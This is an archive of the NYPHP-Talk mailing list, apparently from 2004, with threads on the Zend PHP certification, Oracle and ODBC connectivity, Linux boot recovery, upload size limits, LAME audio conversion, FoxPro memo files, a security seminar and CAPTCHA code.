Ultimately, the value of passing this test will be decided by the people 
who hire you.
For the sake of simplicity, I'm assuming the main reason someone would 
take the test in the first place is career related.

To quote Daniel:
"It is another tool to help the enterprise in the hiring process and to 
help the PHP community in showing their expertise".

I've interviewed quite a few people and unfortunately, terms like 
"extensive knowledge of" or "in depth experience with" are loosely 
defined are not measurable. While looking over a resume, when someone 
says they have any knowledge of any technology, I always take it with a 
grain of salt.
If they say they have some certification, at least thats well defined. 
How that certification effect my decision making is up to me.



Secondly, I think Zend is walking a very fine line regarding what 
subject matter to include.
Based on the "What will be tested" in Daniel's original email, it's 
obvious that the test not only covers the PHP language itself, but also 
many aspects related to programming in general and Internet related 
programming in particular.

For example, I don't think it's fair to ask about "The UNIX epoch and 
the dangers of UNIX dates" on a test that is supposed to measure PHP 
expertise.
If the test was called "Web based programming using PHP on a Unix box" 
then sure, but it's not.

I have a few more comments on the subject, but it's late so I'll 
continue this in another email.

Hope my two cents were helpful.

It's good to see Zend creating a PHP certification, and even better to
have had such a thought provoking thread to follow.

We want to ensure that the NYPHP-Talk list keeps to this level of
quality and discussion.  I would like to remind the list, however, that
commercial posts should not be made without prior approval from NYPHP.

If individuals or companies are unsure whether their post to NYPHP-Talk
could be commercial in intent, for example offering a product or service
for purchase, be sure to contact contact at nyphp.org beforehand.

Thanks all,

I don't believe so.  From:

"The following databases are supported by the Unified ODBC functions:

Not 100% here either.  But why not use OCI8 and connect to Oracle
directly?

There's a lot to do and we're happy to have you help.  The other posts
talked about how to initially get started which is great.

NYCBUG (http://nycbug.org) will be the first to pilot clew as the only
application behind their web page.  Very exciting.  The timeline is in
weeks, rather than months, so there is a big push as Snyder mentioned.

Thanks for the help Mark.  Looking forward to it,

Yes, unless you really have some very compelling reason, you 
should try and connect to Oracle in its 'native tongue'.

The 'unified ODBC' functions are something  different than 
ODBC.

In the manual it says: "several databases that have borrowed the 
semantics of the ODBC API to implement their own API."
And it goes on the name the databases (see above))
Then is says: 
"Note: There is no ODBC involved when connecting to the above databases."

Around 1992 there was a group called the SQL Access Group.
They put out something called the SQL Access Group Call 
Level Interface.

It was an interoperability initiative. The basic idea 
was to have an intersection of the most popular SQL 
dialects of the day. That way you could have the same 
code (sort of like embedded universal sql) which would 
work in the same way but against different databases. 
The concept included common error codes, common data 
types, and a common means of getting a connection to 
the different databases.

Sounds a lot like ODBC right? That's because Microsoft 
took the SAG CLI concept and extended it -- and that's 
what became ODBC.

Microsoft's ODBC Manager hooks up the ODBC version 
('ODBC extended') SAG CLI sql to one or more dynamically loaded 
libraries (dll's or so's depending on the operating system), 
which are known in ODBC parlance as ODBC drivers.

The 'unified odbc' functions are probably (but here I am guessing)  
a separate implementation of the old SAG CLI specification -- 
with the same names as the ODBC functions.

Anyway, there definitely exist ODBC managers for most 
of the unix-style operating systems (as well as other 
more esoteric os's).

And yes, there exist ODBC drivers for Oracle -- 
and from more than one source.

But ODBC drivers come in many flavors.

There are single tier drivers and  multiple tier 
drivers. Some drivers only support the ODBC core 
api. Some drivers support the level 1 api -- some 
say they are conformant with level 2 of the ODBC 
api.

And just when you think you have all the functionality 
mapped out, you can get hit with performance problems.

So if you (still) are seriously considering ODBC, I 
would advice you to make a prototype (to make 
sure you have the functionality you want) and 
hit it with some pretty good volume tests.

I think Daniel is referring to the fact that Zend hired these people as
consultants to help create the certification.

I would put a considerable amount of money against this. I know a lot of
talented programmers, and those who don't know PHP could not pass this
certification if given only a 24 hour notice. PHP interoperates with many
technologies, so the certification is broader than you might be thinking.

> The language is great. I love it. But it is just a tool.

And this is just a certification.

This analogy doesn't work very well. When hiring an accountant, I can't
imagine anyone caring what tools are used. However, with most technology
projects, people do care. Have you seen a job announcement that simply
asks for a skilled and experienced Web application developer? I haven't.

I wouldn't measure the value of a certification according to whether
people would want it on a business card. I think a resume is a more common
and appropriate place for this.

> Further, you make it sound like anybody who is 
> anybody in the PHP world is behind this initiative.

I think that's a misinterpretation. He is just trying to make it clear
that Zend did not create this by themselves.

Rather than wasting time trying to predict opinions, Zend is doing
something, and people will have a chance to voice their opinions with
their wallets. I'm sure their voices will be heard.

Yes, I and am agreeing with him there. But I am also widening the

I guess I wasn't too clear there -- I was trying to restate  
the case (from earlier in the thread) that a certification in 
the language alone would not be of much value.

When it comes to talking about the level of expertise and 
and knowledge required to pass the 'this certification' you 
(and Daniel) are infinitely more qualified than I am to talk 
about that -- you helped create the Zend test questions.

But I don't believe that I might be thinking that the 
Zend certification (test) will not be broad in terms of how 
'PHP interoperates with many technologies' -- just the 
reverse, I mentioned that I thought it might take more than 
70 or so questions to cover all the areas mention in the 
'12 chapters' -- again I don't have any real knowledge on 
that (not knowing what the questions are). And it could very well  
be, that the questions in their final form will adequately 
cover what needs to be tested.

No, of course not -- they have job requirements too.

Well I won't get into where's the more appropriate place 
to put one's certification.

However, many, many -- if not all - Microsoft Certified 
Solution Developers have 'MCSD' prominently displayed on 
their business cards. (It is one of the motivating factors in 
becoming certified) -- it is definitely not less common.

I'm neither involved in writing the exam, nor do I plan on taking it,
so I've been staying out of this discussion.

However, I would say that you don't need to actually have questions on
every topic on the test. You just need to threaten to do so, and then
people will be forced to study for them. :)

Well, I guess time will tell. As someone looking for PHP talent right now,
I can say that this would at least be somewhat useful to me. Yes, I'm not
about to choose candidates based solely upon whether they are certified,
but I currently have to spend a lot of my time just to weed out those who
are definitely underqualified. I feel pretty confident that someone who is
capable of passing this test is worth taking the time to speak with.

I think finding good programmers is a very difficult task - at least it is
for me. And, I tend to value other qualities more than programming
proficiency. The creativity and intelligence of the person are more
important than their syntactical knowledge to me. Then there's the
important beer test - is this someone you can enjoy having a beer with?
Stated differently, personality matters a lot. I feel confident that a
friendly, creative, and intelligent person will make a great employee, and
I can probably teach them anything they lack. Because of the perspective I
take, this certification could take care of the question, "Does this
person know PHP well enough to be a candidate?"

That's all.

There is a psychometrician who is responsible for calibrating the test
according to the level of expertise required, and I don't really know much
about this at all. I'm not even sure if I spelled it correctly. :-)

I see what you mean now. After trying to come up with questions, I have
found that it's pretty easy to make a question where someone is going to
have a hard time choosing the right answer if they don't know several
different things. In fact, I found it more challenging to focus questions
on only a few things (or one specific area of knowledge). I'm not sure if
that even makes sense.

Small software company seeks talented Web applications developer. Duties:
create Web applications that are secure, robust, and scalable. Must
possess a BS in computer science or similar field. Must work well with
others and have strong analytical skills.

I've never seen a job post like this in my life.

My point is that the two industries are very different, and it doesn't
make sense to me to be trying to draw parallels. I've seen Web
applications developer postings that even specify the text editor to be
used to write code. Of course, I would argue that the current approach in
the computer industry is very broken (the accountant job post seems much
more appropriate), but that's just the way it is.

> But the job requirement go something like: " 4 yrs exp 
> Java and knowledge of CGI scripting in a UNIX environment..."

Yes, and this just reiterates my point. I have seen more than my share of
job postings that think Java == Web development. What they really want is
an experienced Web applications developer, and what they ask for is 4
years of experience in Java. They even did this before Java was 4 years
old.

Well, MCSD is different. In fact, I imagine that MCSD poses the greatest
challenge to Zend, because it has devalued the whole idea of
certifications. Far too many people think that certifications are
absolutely worthless, and the number of clueless MCSDs is a big reason
behind this. If I were an MCSD, I can guarantee you that it would be my
dirty little secret. There's no way I would devalue my resume by
mentioning that.

Cisco certifications are much more respected and better illustrate your
point, and these also have nice little acronyms to add to your business
card. But, these types of certifications require a strong theoretical
foundation verified through an extensive series of tests, whereas knowing
a programming language only requires a bit of practical knowledge.

I think job candidates need to be careful what they "brag" about and
where. If you're too proud that you know PHP, it makes people like me
wonder whether you have anything else to offer. As you have said, PHP is
just a tool. It's sort of like those people who mention knowing Microsoft
Office on their resume; I'm sure that's appropriate for some things, but I
immediately eliminate them from consideration for any technical position.

> There I couldn't agree with you more -- time will tell.

Yep, we will see. :-)

Thanks for the friendly debate.

And isn't that sad? It is really an ad for a group leader or Director... 

"Small software company seeks talented Web applications lead developer or Group Manager. Duties: build, motivate, and lead a team of developers

That's more like reality in my experience, and matches what most have been saying here. There is likely a place on that team for a PHP expert or two, with or without broad expertise beyond PHP. In fact, if it was my team, there's be one expert PHP guru whose ancillary skills could be underwater basket weaving and French cooking, for all I care. I want him for his knowledge of PHP - I'll use the database guy for the database, the designer for ....... etc etc. In that perfect world, I would welcome a strong PHP certification.

Yes.

I've never liked the tendency for people to make decisions in areas in
which they are clueless, and this is exactly what happens in a lot of
large companies (even though there are better alternatives). A business
manager will make important decisions about technology when he/she has a
more capable staff (hopefully consisting of a technical manager of some
sort) that should be making such decisions.

I like the idea of everyone doing their own job and doing it well. A
technical manager should be the one who does the software design and makes
the big-picture decisions regarding technology, not the business manager.
A business manager should be making business decisions.

Of course, this also has as much (or more) to do with old company versus
new company, and new companies have a distinct advantage. If business is
considered to be above technology rather than a separate discipline, the
technology of the company usually suffers. You end up with unqualified
people making decisions, and you also get the "all technical people are
the same" mentality, where the only difference between technical personnel
is a slight fluctuation in salary.

A more modern and savvy company will treat the two distinctly, and
technical personnel have multiple tiers according to their purpose. This
has a few advantages:

1. The "roof" is higher, which gives you better personnel. The master
hackers that you really want to employ aren't going to be satisfied with
"graduating" to any sort of business or management position. You need to
have higher technical positions.

2. A better division of labor is achieved. You can have technical
managers, software engineers, data modeling experts, security officers,
disaster recovery experts, network experts, systems administrators,
database administrators, and programmers. People can do what they're best
at doing, and the sum of the parts is a better development team than you
could otherwise achieve. You get people doing what they do best.

3. Motivation is higher. Your technical personnel will respect a master
hacker to whom they must report. When you have technical personnel
reporting to someone they view as clueless (which is how most of your
business staff will be viewed, like it or not), then they're more likely
to be dissatisfied at their job, and your productivity and creativity
suffer.

Anyway, I suppose I've drifted off-topic now, and I could rant about this
all day. :-)

That sounds pretty bad. Is there anything on the drive/partition that 
was vital?
You can always boot off a floppy or cdrom then mount the linux partition
to regain access to your data... after that, I would suggest you back up 
the data elsewhere.
recreate the initrd directory and reboot. If that does't work, then it
may be time for a reinstall (which isn't so bad with RedHat as compared to
say... Slackware 1.2.13).

Firstly, let me say I am very hesitant to say 
anything here.

But since you said you would like to hear 
*any* advice....

If I understand your situation, it seems that 
the file system is still intact but you have 
managed to clobber all the device drivers
(or at least the CD driver)

If you could boot from a floppy disk,
it might turn out that it would 
put back some device drivers.

Once you have sort of manually bootstrapped 
your system up, you could try and take it from 
there ...

Ive used "LTOOLS" before to get myself out of a booting jam (I know
writing to FAT32 can be rough), but this time it seems to have removed
folders (usr,opt,var,etc,etc) ... I just dont get what an empty folder
would do considering it was not symlinkd to begin with ... (its
aparently a RedHat only thing, so Im going to try posted there) ...
thanks for recommendations.

Well, any time you use a MS thing to fix another OS, what can you
expect?  :(

I think one issue will be your disk layout. If MS whacked that you've
got problems. If you can boot from a diskette or cdrom and see if "fdisk
/dev/hda" (or whatever your primary HD is) looks normal, then "write"
the label again.

I'd try that, and if it works,while cd is still in see if you can create
the missing filesystem and copy whatever is in the cd over there.

You might look for a spare HD and install there and then fiddle with
moving/copying things around that way.

You may be able to do an "upgrade" type install and hopefully save some
files.

You still have options, but it might not be easy...

ciao!

I great oppty for a Live CD. I have found Gentoo does a great job 
detecting hardware (as does Knoppix). Boot Gentoo from a CD and then 
mount your hard drive and access your files. If you are sure it's just  
a drivers issue (I am not, but I am not expert by any means) you can 
check Gentoo's proc/sys etc and get great clues (enough clues?) to 
rebuild your redhat to bootable/recoverable.

You might try out one of the bootable CD distros (notably Knoppix, but 
there are others).  They have some great tools that you can use to work 
on your system 'off-line', mount/unmount the hard drives, etc., because 
the whole thing runs from a CD.

Well *almost* bit the dust there ...

I ended up temporarily renaming lost+found to initrd (using LTOOLS) and 
got everything back up again ... I had began recently to read on how the 
distros are setup differently from each other + never came across it 
(under /boot are all the initrd's for each kernel)...

Hopefully this tip helps out another poor soul dumb enough to delete an 
empty RedHat /initrd folder :-)  Thank you all for quick responses.

Yes Im sure thats what they are made for ... (getting newbies out of 
serious trouble :-)  My favorite bootable is knoppix-std which I would 
have ended up using (anything without the bloat + included fluxbox is a+ 
for me) ... there are so many to choose from nowadays ... did anyone end 
up writing an ISO for PHP demos yet?

Anyone have any experience with sessionids over load balancer?

I've got a situation where I've got three servers load balanced and the PHP
session is being written/read from the database.

I just want to be sure PHP has no issues with hitting a different server in
that situation - although the load balancer keeps track of IPs a redirects
to the same server, in cases of AOL and others the user is likely going to
hit another server.

Could there be any issues?

Thanks,
Chris

Nope, that should work just fine.

This (server affinity) isn't necessary, so unless you need it for
something else, I wouldn't bother. Your load balancer can do its job
better if you don't restrict its ability to make a decision.

As another tip, lsof can often save some problems.

[root at zaunere root]# lsof | grep -i initrd
bash      18240 praxis  cwd    DIR        3,2       4096    1671169

What distro of Linux are you running that it even shows up @ all? (just 
curious) ... true lsof is a great tool but gotta boot up before I can use it :-)

Subject: [nycphp-talk] PHP functions constantly produce false until I reboot
	server???
Message-ID: <40D73D4A.8030701@adnet-sys.com>

Has anyone else had problems with PHP versions 4.3.2 in RH 7.3 whereby 
the most basic of PHP functions fail such as:

echo strrpos('wwwwwww', 'w');

produces false??

However, if I do a complete server reboot, everything is just fine?  
This has happened here on our server here at work off and on for weeks 
now and I'd like to know what is causing this to occasionally occur, if 
anyone else ever run into anything like this.

Thanx
Phil

Subject: [nycphp-talk] Best way to handle LimitRequestBody $_REQUEST
	limitation
Message-ID: <40D7593C.5000706@adnet-sys.com>

Background: I'm building a totally portable/scalable/secure file 
cataloging system in PHP version 4.3.2; this application will be 
portable for all systems that have PHP, whether Windows or Unix or 
whatever as its goal as it is a web-based portable application.

This application allows you to upload a file of a certain file size that 
I have set up.  For example, if you set $maxImageFileSize to 100K then 
no image larger than 100K can be uploaded to the system, it won't let 
you.  This works just fine.

However, if I try to upload an image or something that is larger than 
LimitRequestBody size of, for example, 524K, the results are a bit more 
problematic than an error message, all sorts of bad crap occur depending 
on your browser that blows up the entire application.

I want to know the best-practice method to handle this.  Readjusting 
LimitRequestBody in /etc/httpd/conf.d/php.conf is not an option 
according to my company because this application is, again, designed to 
be portable, so that it can be mounted on Client A's server or Client 
B's server or Client Z's server and work exactly the same on all three 
even if all three have completely different configurations to 
LimitRequestBody.

So, what do I do?  Files < 100K are fine; files 100K+ - 524K are fine; 
files > 524K bomb the entire application and I can't figure out what to 
do about that.

I tried displaying a message that stated that the maximum image file 
size that this installation of PHP on this server can handle is 524K but 
using ini_get('LimitRequestBody') and get_cfg_var('LimitRequestBody') 
both failed.

Ok, I'm out of ideas, great brains of NYPHP, lend me some brain cells!

Thanx
Phil

LimitRequestBody isn't a PHP configuration directive... it's from Apache
itself.

http://httpd.apache.org/docs/mod/core.html#limitrequestbody

AFAIK there's no way to set it in PHP.  That said, it's not set by
default.  Otherwise, you could include a .htaccess file that sets it to
0 explicitly and thus make it unlimited.  Then again, if the deployed-to
Apache environment doesn't allow .htaccess directives, it wouldn't work.

Cool possibly, Hans, but again, background: this application must be 
completely portable with virtually NO changes to the client's server 
environment to run it. 

I came up with the following.. works in Apache, but fails in IIS:

Following is my function I wrote to retrieve the value of 
LimitRequestBody in php.conf if the webserver is Apache:

[PHP]
/*-----------------------------------------------------------------------------------------------------------------------------
    There is no native method in PHP to obtain a value that is in a 
separate CONFIG file, particularly
    /etc/httpd/conf.d/php.conf, therefore, you will have to obtain it 
yourself the hard way: splice up the
    file and retrieve and set into a session variable, or, obtain from 
the existing session variable
  
-------------------------------------------------------------------------------------------------------------------------------*/
  function &getLimitRequestBody() {
    global $limitRequestBodyFilePath;
    if ($_SESSION['limitRequestBody']) {
       return $_SESSION['limitRequestBody'];
    } else {
     $fileID = @fopen($limitRequestBodyFilePath, 'r');
     if (!$fileID) return 0;    // BOMB OUT - $limitRequestBodyFilePath 
SET IN CSV FILE AND IS REQUIRED TO OBTAIN LimitRequestBody
     $contents = @fread($fileID, filesize($limitRequestBodyFilePath));
     @fclose($fileID);
     preg_match('/LimitRequestBody[\s\t]*([0-9]+)\n*/i', $contents, 
$matchArray);
         $_SESSION['limitRequestBody'] = (int)trim($matchArray[1]);
     return (int)trim($matchArray[1]);
    }
  }               


[/PHP]

Nice function, however, HUGE dilemma: the application that will use this 
function is designed to be fully portable, that is, it can run in Apache 
or IIS or anything that can run PHP.  That means everything in this 
application needs to run equally in any webserver that can handle PHP, 
including this function.

This function works only if you're using Apache since it retrieves a 
specific file /etc/httpd/conf.d/php.conf that has a value I need that 
PHP itself cannot provide to determine the absolute limit of a request.

So how do I write this for IIS or any other PHP-friendly webserver?

Thanx
Phil

Do IIS and other non-apache servers impose the same limitation?

As the web server will normally be the layer above php you will have to
resort to such hackery using whatever configuration files (IIS uses the
metabase which IIRC is similar to the windows registry) are needed before
presenting any upload interface... basically it seems you're gonna be
writing custom code per web server variant... :(

Another huge problem is security.  The user that Apache/PHP doesn't
always have read access to the conf files... I know on all of my
platforms they don't.  This is not a solution, it's a hack.

And sure, it's totally not portable.

There's no solution here that I can see.  As part of installing/setup
directions for the application, you just need to mention these issues.
It's not possible to always make an application totally portable, and in
fact it rarely is.  Your application has some level of dependency that
your end-user has to be aware of.

Crud. *sigh* Well, after making a checklist of requirements and 
dependencies, my application
appears to work best in a LAMP environment (surprise surprise) and I've 
taken your advice inasmuch
as noting in my documentation the need for allowances for minimal read 
access to php.conf for the
webserver and/or webserver group.   Allowances for .htaccess are, for 
now, only for error handling (although
I might allow for specialized .htaccess to free up LimitRequestBody to 
unlimited per client request).

Thanx

Not as far as I know, we're still using the out-of-the-box PHP 4.3.2 
here on this server.  There was
talk of an upgrade to 4.3.7 a while back but it's been put on hold for now.

Subject: [nycphp-talk] connecting to oracle w/ php
Message-ID: <40D84727.5090909@tdavidvogel.com>

Just wondering if anyone with experience using php to connect to an 
oracle server has any insight into a problem I'm having.

using PHP 4.3.2 on apache 1.3.27 to connect to oracle 8i on win2k
OCIlogon() connects successfully but only after about 30 seconds.

I never done much with oracle and I suspected a server config problem, 
but the oracle guys from the company (diebold, ugh) who set up the 
server disagree so I'm wondering if there are any known problems to 
watch out for w/ php, env vars that may be set wrong or something like 
that.  I'm pretty sure it's not a network problem or anything, 
connecting from diebold's front end is very fast, only having probs from 
www script.  Thoughts?

thanks,
Dave

Just wanted to point out, there's a good reason Apache has a limit set 
by default - setting it to unlimited effectively opens up the web server 
for a denial of service attack by uploading massive files that tie up 
the server and fill up the disk...

That would be true if this were a public application.  As it is set up 
it is meant to be in a privately-accessible directory that only 1 or 2 
people would be using, thus, the directory with the specially-tailored 
.htaccess file would be only vulnerable to 1 or 2 people.  Which would 
stand to reason that if a denial-of-service attack were to occur, IAPW, 
it would be easy to find out who did it.

Are you attempting to connect via an IP address or a domain name?  Maybe 
a slow DNS server?  It sounds like an identd timeout though.  Do you 
have the same delay running 'sqlplus' from the command line on the web 
server?

Just a thought:

Is the web server on the same box as Oracle?  Would an entry into the windows HOSTS file help?

Subject: [nycphp-talk] WAV to MP3 conversion with LAME
Message-ID: <BCFDDF43.21347%stephen@musgrave.org>


hello list -

this is an obscure situation, but on the off chance that someone has had
this experience...

my client is using angel.com call center services.  the voice mail is saved
as a WAV file, we suck that down to our server and convert it to MP3 using
LAME on LINUX.  the problem is that the resulting MP3 file is noise (and the
duration of the file is also about 1/4 of the original).

it feels like the bitrate, sample size and or sample rate is out of sync,
which it probably is, but i am not a digital audio expert by any means!
(i've tried various settings including 'auto').

when reading the output log from lame, it warns:

Warning: corrupt or unsupported WAVE format
Assuming raw pcm input file

also, when converting the WAV file with iTunes to MP3, it works just fine.
i suspect that angel.com is writing their WAV files missing some header
information?

so, if anybody has any light to shed on this stumper, it would be greatly
appreciated!

stephen

Message-ID: <C0CDB9F5E81C234FBB42D84E7853125DC1BA41@intamail1.inta>

This does sound like they are using an off-standard PCM encoding, either
storing it at an unsual bitrate or omitting the header information, yes. I'd
contact angel.com to get the scoop on that format and adjust your LAME
encoding accordingly. Alternately, you're just going to have to muck areounf
with "feeds and speeds" of decoing the PCM stream. 

Do some math on the duration change between the PCM file and your mp3
output, that might be a place to start to determine the factor by which the
sampling must decrease. For example, you might be trying to encode an 11k
PCM stream at the "standard" 44k, which (in theory) would result in your 1/4
ratio of source to destination. The same would happen if you're encoding a
22k mono stream at 44k stereo. Source is halved once by the doubled sampling

In case you haven't, try
`lame --longhelp`
or
`man lame`

You will need to specify -s for the freq of the wav file.
I would also look at -m
If you have a program that can examine the bitrates/channels etc for the
wav files you will find what you need.
>From what I can gather they are MONO at 128kbps and 80KHz

Hope that helps some..

chris & joel -

thanks for the comments.  i failed to mention in my original post that when
i pull angel.com's WAV file into iTunes and look at the info, the file has
the following characteristics:

Sample Rate: 8.000 KHz
Channels: Mono
Sample Size: 8 bit
Bit Rate: 64kbps

while LAME works "automatically", since it isn't recognizing the file, i've
attempted to force these numbers when converting in LAME.

lame -s8-bitwidth8-b64-mm source.wav target.wav

i've tried this several different ways, suppressed filters, etc, etc.

<shrug>

What version of lame are you running?
If older, have you tried newer versions, or tried recompiling it?

Joel -

The install is from an RPM installed by the hosting provider.  Also, i'm
wondering if you think that taking a listen to the source and target files
would be of benefit?

Here's the log output:

Make sure you are converting mono to stereo -- that was the cause of numerous
woes when I tried some text-to-speech experiments a while back...

See http://chxo.com/be2/20030806_2a0f.html for the whole sorry tale.

Or just skip to the bottom to find:

Mind sending me that file...
I will take a look at it and perhaps see if something is amiss.

Hi there:

I'm working with data from a museum archival database (PastPerfect) 
that was created in FoxPro.  I am not very familiar with FoxPro 
databases, and I am a little confused about what the different 
component files.

Each 'table' seems to have an associated .DBF file and sometimes .FPT 
file.  Initially, I was ignoring the .FPT files altogether, but there 
is some data that I need to parse out of this database that I can't 
find, and I am beginning to think that maybe it is stored in the .FPT 
files?

The data I need to get to is generally longer description-type data, 
which I am not seeing in the DBF files.

So...first of all...am I on the right track with trying to find my 
longer descriptions?  (I have to ask that, because I am not quite 
sure what .FPT files are used for...the MSDN reference refers to them 
as 'memo files', but I am not sure what that means.)

Secondly...anyone aware of a class or set of functions that can read 
these files?

Anything that could help clear up my confusion is welcome.

Foxpro files, depending on the version are usually in the following
relationship

.dbf -> main data file
.fpt -> memo fields
.cdx -> Index files
.dbc -> data base containers

I am using php on IIS on a win2k server, I created an odbc connection
(system) on the server
And can access these files read/write using the odbc connector in php

Mike's right.  

The "memo fields" that he's talking about is the "longer description-type data" that you are searching for.  One of FoxPro's biggest weakness AND strengths was in the fact that each component (table, indexes, forms, reports) was a separate file, unlike Access that keeps all components in a mdb (and an associated index file).   You could split the files up in different locations or compile parts into a binary... and some other interesting manipulations. Conversely, everytime I wanted to archive a working project, I wound up needing to zip 30 or 50 files into a zip file.

There are a couple of tools out there that will take FoxPro files and turn them into a Access or MySQl db.  That won't solve all your issues... but it might allow you to see the data in a more comfortable format based on your previous experience.

I'd be happy to give you the names of the tools if it would help.  I can send them when I get home this evening.

In this case, his was in Microsoft U-law format..
lame expects PCM so you just do
`sox foo.wav -f bar.wav`
Which converts it to PCM then he can feed it through lame just fine.

Joel, Chris & Chris -

Thank you all very much for helping me along with this.  We're having the
SoX RPM installed and we should be on our way shortly.  I will be sure this
information gets shared onto the angel.com web site.

Again, thanks.

I'm using the IP.  There's a similar delay in disconnecting from sqlplus

OCI connections have a significant amount of overhead, and can cause 
noticeable performance hits as a result.  My favorite solution to this 
dilemma is to set up sql relay, as it can cache your database 
connections - as well as give you a bit of added flexibility with 
switching database servers and platforms...

    http://sqlrelay.sf.net

PHP-specific stuff here:

    http://sqlrelay.sourceforge.net/sqlrelay/programming/php.html

Another option for you is to bypass the PHP->Oracle stuff and use an 
abstraction layer to manage that for you, one very popular one is ADOdb:

    http://adodb.sourceforge.net/

And on this very list is a very, VERY good guy and programmer that works 
on PEAR::DB:

    http://pear.php.net/manual/en/package.database.php

...although I assume that PEAR::DB uses the internally-supplied PHP to 
Oracle driver.  Is that correct, Dan?

Yes.

I'm running Windows 2000 and Oracle 9.2.  Connection times aren't 
noticeable.  Here's my PEAR DB DSN for connecting:
oci8://<username>:<password>@/<dbname>

So, your system is having problems.  Of course, WHAT problem is the 
question.  The folks thus far have given very good suggestions.  My only 
additional thought is a problem with the TNS listner.  If I understand it 
correctly, there are two types of Oracle connections.  One via a local 
socket (or maybe a TCP/IP connection) (which is how I believe I'm 
connecting) and then the other via this TNS 
dohickey, which I know nothing about.  I hope someone fills in more 
information here and/or corrects me.

If you do try DB, make sure you're running a current version (1.6.4).  I 
suggest giving it a shot just to see if it connects normally or not.

Subject: [nycphp-talk] Karma Discounts on Security Seminar
Message-ID: <002c01c4592d$c4973220$e98d3818@oberon1>



There have some cancellations for the Security 
Seminar (given by Chris Shifflet) tomorrow 
evening from 6:00 - 8:45 at the Masonic Hall
at 71 West 23rd St. 
 directions at:
(http://www.tgaconnect.com/web/ssdirect)

This means there will be some (more) extra 
seats available.

I can tell you I was more than a little 
annoyed with one or two people, who from 
the begging said that it would be great to 
have affordable PHP training -- we support 
you all the way (meaning go rent the 
facilities and we will show up) -- and now 
are not going to show.

My initial reaction, in an attempt to turn this 
adversity (of people not showing) into an 
opportunity was to offer discounts.

But after thinking about it for awhile, I 
realized that that idea would only make 
matters worse for training in the future.

People would wait and not commit to coming to 
future seminars hoping to get in for a 
discounted price.

That would make things considerably worse 
in trying to plan and schedule the events
(that has been the major stumbling block 
so far in getting this seminar series going -- 
people not making a more definite commitment 
early enough to get things set up)

So my new idea is 'karma discounts'.

Here is how it will work:
If you use the information you gain from 
the seminars in 3 hours of contribution to 
a participating open source imitative, you 
can receive up to a 50 percent discount on 
the price of admission to the upcoming 
seminar (and future seminars).

The discounts will be ongoing in the 
future -- i.e. you don't have to wait 
until the last minute and see if there 
will be vacant seats (like flying standby 
or something like that).

Sorry about the length of this post, but I 
want to note something interesting about 
karma.

The law of karma, says: `for every event that occurs, 
there will follow another event whose existence was 
caused by the first, and this second event will be 
pleasant or unpleasant according as its cause was 
skillful or unskillful.' 

Of course the 'skill' being talked about there is 
really mental (and spiritual) attitude. But it makes  
for an interesting parallel meaning when applied 
to web development -- if you do something 
(create a web app) without the proper skill set 
the following (or resultant) event can be very 
very unpleasant.

One last (thankfully -- I know this is too long)  
remark on karma for the people who are already 
planning to attend (mostly motivated, I realize, 
by trying to help get the training program off 
the ground):

Thank you, and I hope that destiny, fate, or 
whatever you want to call it, boomerangs (as it 
often does) and (more than) repays you for your support. 
I have more than a strong inkling that attendees 
just might receive a lot more understanding than 
they 'bargained for' (it could happen).

To close, let me quote Woody Allen's metaphysical 
words of wisdom:

"Eighty percent of success (in life) is showing up."

Woody Allen.

P.S. 

Anyone interested in coming to security seminar, 
please contact me off list..

There is one I wrote here

Which solves a lot of the issues I dealt with in breaking captchas on
various sites to automate singins etc. That page is where my install of
qmail sends people who are not in my whitelist.

If you are interested in the code that produces the image.

and the functions:

There is a pretty good new one in the PEAR proposals ..

http://pear.php.net/pepr/pepr-proposal-show.php?id=80

I have tinkered with it but have not plugged it in anywhere since I
havent needed to use it yet ... but probably better to support PEAR
stuff for the PHP group. (I think).

Hello,

I have implemented an ASCII-art based CAPTCHA system to prevent my Wiki 
(tavi.sourceforge.net based) from being spammed by spambots.

I have a post and code available on my weblog:
http://www.moztips.com/index.php?id=222

I have used some external class(es) for the generation of ASCII art text 
   (through the use of Figlet fonts) and other things.

If my patch files don't make sense, please feel free to ask for a 
classification system.

You can see an example of the code in action, but going to the following 
page and click on the "Edit this document" link on the bottom:

http://www.moztips.com/wiki/index.pcgi?page=SandBox

I have also implemented a logging mechanism that logs who made a mistake 
while entering a code, and when that mistake occured.

Best Regards,
- Jay

Thanks everyone for the suggestions.  sql relay would be a good fix I 
think, but unfortunately isn't possible in the short term.

I haven't been able to get PEAR::DB to work because the server I'm 
connecting to isn't in tnsnames on the webserver and so I need to use 
the full connect string.  Is there a way to  specify the full string w/ 
PEAR::DB?

Perhaps that's the source of your delay?

Post the code you're using to connect.

$dsn = 'oci8://user:passwd at tcp+132.198.217.254:1521/ORACLEGOLD';
$db = DB::connect($dsn);

ORACLEGOLD is the service name I tried it with the SID as well to no avail.

I don't think the server tnsnames not having a record for my oracle 
server is the problem we tried adding it and it behaved the same way.  I 
probably should get it put back in though so I wouldn't need the whole 
connection string unfortunatley that's easier said then done due to the 
people involved, ain't beaurocracy grand.

thanks,
Dave

Did you look into the MS SQL commands that PHP currently supports, such 
as mssql_connect(), etc.?

You mentioned using your own PHP scripts that connect to Oracle.  I want 
to see that connection info.

oh sorry, I thought you were wondering about the PEAR part.

 $db = "(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)
              (HOST = 132.198.217.254)(PORT=1521))
              (CONNECT_DATA=
              (SID = ORCL)
              ))";

$c = OCILogon('USER', 'PSSWD', $db);

does anyone know if you can use JRE 1.5 with the new Zend Studio?  i 
attempted to symlink it and it appears to stall (read decent reviews on 
1.5 in Linux Format this week) and the Swing apps appear to (by miracle) 
run alot faster than previous runtimes.  however i beleive its still in 
beta ...

the studio seems to recognize all methods throw down from interfaces + 
subclasses for php5 smoothly now ... i also like the support for ssh - was 
this in previous versions?

To make that fly in PEAR DB, connect using an array for the DSN and put 
that $db stuff in the 'hostspec' element.

http://pear.php.net/manual/en/package.database.db.intro-connect.php

Not that it'll solve your problem.

Have you checked groups.google.com? 
http://groups.google.com/groups?group=comp.databases.oracle
Enter the search terms "connect delay," select the "Search only in 
comp.databases.oracle.*" radio button and do the search.  I guarantee 
there will be lots of results and you're likely to find your answer.

I would suggest sending an email to ide at zend.com (although they might
throw you to the online support system) ;)

The SSH is new in version 3.5 and a very welcomed feature !

5 yet? I started to use Phrame, then realized that it was not PHP 5
compatable due to the new way it handles XML. I was thinking about
rewriting it, but I just wanted to gather some opinions first.

Are you able to connect to the Oracle server via sqlplus from your Web
server?

Tim, why not also require payment in advance and establish a reasonable
refund policy? Then you get instant karmic retribution for not showing
...in a sense.

What would be pretty nice is a Struts like application for PHP5 ... basically all your mappings are in XML and sit 
